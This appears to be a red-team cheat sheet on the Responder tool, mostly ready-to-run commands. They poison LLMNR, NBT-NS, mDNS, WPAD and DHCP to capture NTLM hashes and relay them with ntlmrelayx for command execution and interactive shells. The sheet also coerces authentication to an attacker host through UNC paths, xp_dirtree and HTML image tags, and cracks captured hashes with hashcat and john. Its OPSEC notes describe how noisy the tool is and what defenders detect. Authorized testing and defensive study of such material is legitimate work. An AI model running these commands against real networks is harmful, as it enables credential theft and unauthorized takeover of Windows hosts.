# Responder

**Tags:** `#responder` `#llmnr` `#nbns` `#mdns` `#ntlmcapture` `#poisoning` `#lateral` `#activedirectory`

LLMNR, NBT-NS, and MDNS poisoner with rogue authentication servers. When Windows hosts fail DNS resolution, they fall back to LLMNR/NBT-NS broadcast queries — Responder answers these with its own IP, then captures NTLMv2 hashes when the host attempts to authenticate. Also runs rogue SMB, HTTP, MSSQL, FTP, and LDAP servers to capture auth from any protocol.

**Source:** https://github.com/lgandx/Responder — pre-installed on Kali (`/usr/share/responder/`)
**Config:** `/usr/share/responder/Responder.conf`

```bash
# Start Responder (capture only — default)
sudo responder -I tun0

# Hashes saved to: /usr/share/responder/logs/
```

> [!note] **Responder + ntlmrelayx** — When SMB signing is disabled, don't just capture hashes — relay them for instant code execution. Run Responder with `-w -d` alongside ntlmrelayx. Set SMB and HTTP to Off in Responder.conf to avoid competing with the relay tool.

> [!note] **See also** — Windows-foothold counterpart (same poisoning attack, runs on a Windows host): [[Tools/Lateral Movement/inveigh|Inveigh]]. Relay instead of crack with [[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]]; force auth on demand with [[Tools/Lateral Movement/Coercer|Coercer]]; passively sniff creds off the wire (no poisoning) with [[Tools/Network/PCredz|PCredz]]. Also [[Services/Active Directory/Entra ID|Entra ID]] Seamless SSO section (NTLM hash from the `autologon` endpoint). Protocol background: [[Standards & Protocols/NTLM|NTLM]].

---

## Basic Usage

```bash
# Capture mode — answer poisoning requests and capture hashes
sudo responder -I tun0
sudo responder -I eth0

# Verbose — show all requests (not just captures)
sudo responder -I tun0 -v

# Start the WPAD rogue proxy server (serves wpad.dat → clients auth to us)
sudo responder -I tun0 -w
# Force auth on the WPAD/proxy fetch (may pop a credential prompt on the client):
sudo responder -I tun0 -w -F     # -F/--ForceWpadAuth ; or -P/--ProxyAuth (not with -w)

# Force NTLM downgrade (capture NTLMv1 — easier to crack)
sudo responder -I tun0 --lm

# NOTE: LLMNR / NBT-NS / mDNS poisoning is ON by default — no flag needed.
# -d is DHCP, not DNS: -d/--DHCP poisons DHCPv4 and injects WPAD in the lease.
sudo responder -I tun0 -d
# -D/--DHCP-DNS injects US as the DNS server via DHCP instead of WPAD.

# Aggressive — default poisoning + WPAD server + DHCP injection + verbose
sudo responder -I tun0 -w -d -v
```

---

## Responder.conf — Key Settings

```ini
# /usr/share/responder/Responder.conf

[Responder Core]
; Set to Off when running alongside ntlmrelayx
SMB = On
HTTP = On

; Other rogue servers
HTTPS = On
SQL = On
FTP = On
IMAP = On
POP = On
SMTP = On
DNS = On
LDAP = On
```

```bash
# When relaying with ntlmrelayx — turn SMB and HTTP OFF
sudo nano /usr/share/responder/Responder.conf
# Set: SMB = Off, HTTP = Off
sudo responder -I tun0 -w -d
```

---

## Relay Mode Setup (with ntlmrelayx)

```bash
# 1. Find hosts without SMB signing (relay targets)
netexec smb 192.168.1.0/24 --gen-relay-list no_signing.txt

# 2. Edit Responder.conf — set SMB=Off, HTTP=Off

# Terminal 1 — Responder poisoning
sudo responder -I tun0 -w -d

# Terminal 2 — ntlmrelayx relays captured auth
ntlmrelayx.py -tf no_signing.txt -smb2support
ntlmrelayx.py -tf no_signing.txt -smb2support -c "whoami"
ntlmrelayx.py -tf no_signing.txt -smb2support -i    # interactive shell
```

---

## Hash Output & Cracking

```bash
# Hashes saved to /usr/share/responder/logs/
ls /usr/share/responder/logs/

# View captured NTLMv2 hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# All captures combined
cat /usr/share/responder/logs/*.txt | sort -u

# Crack NTLMv2 — hashcat mode 5600
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack NTLMv1 — hashcat mode 5500
hashcat -m 5500 ntlmv1_hashes.txt /usr/share/wordlists/rockyou.txt

# John
john --format=netntlmv2 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Triggering Authentication (Speed Up Captures)

Responder is passive — waits for broadcast traffic. Trigger auth manually to speed things up:

```bash
# From compromised Windows host — trigger UNC auth to Kali
dir \\KALI-IP\share

# SQL Server coercion
# EXEC xp_dirtree '\\KALI-IP\share'

# Force WPAD proxy auth (responder -w)
# All browsers request http://wpad/wpad.dat — Responder serves fake WPAD

# HTML page with embedded UNC path (captures browser NTLM auth)
# <img src="\\KALI-IP\share\img.jpg">

# Use Coercer for forced auth from any host
coercer coerce -t 192.168.1.10 -l KALI-IP -u user -p Password -d domain.local
```

---

## Rogue Server Captures

| Server | What It Captures |
|---|---|
| SMB | NTLMv1/v2 from file share auth |
| HTTP/HTTPS | Basic + NTLM web auth |
| MSSQL | SQL Server auth |
| FTP | Plaintext FTP credentials |
| IMAP/POP/SMTP | Mail client credentials |
| LDAP | LDAP bind credentials |

---

## OPSEC Notes

- Responder is **very noisy** — responds to all LLMNR/NBT-NS broadcasts on the segment
- Many enterprise SIEMs alert on unexpected LLMNR responses from non-DC hosts
- Windows Event ID **4648** may appear on clients when unexpected auth occurs
- Run only on segments where you're expected to be — avoid running on DC subnets
- Use `-A` (analyze mode) first to see what broadcast traffic exists without poisoning

```bash
# Analyze mode — passive listening only, no poisoning
sudo responder -I tun0 -A
```

---

*Created: 2026-03-06*
*Updated: 2026-08-29*
*Model: claude-opus-5*
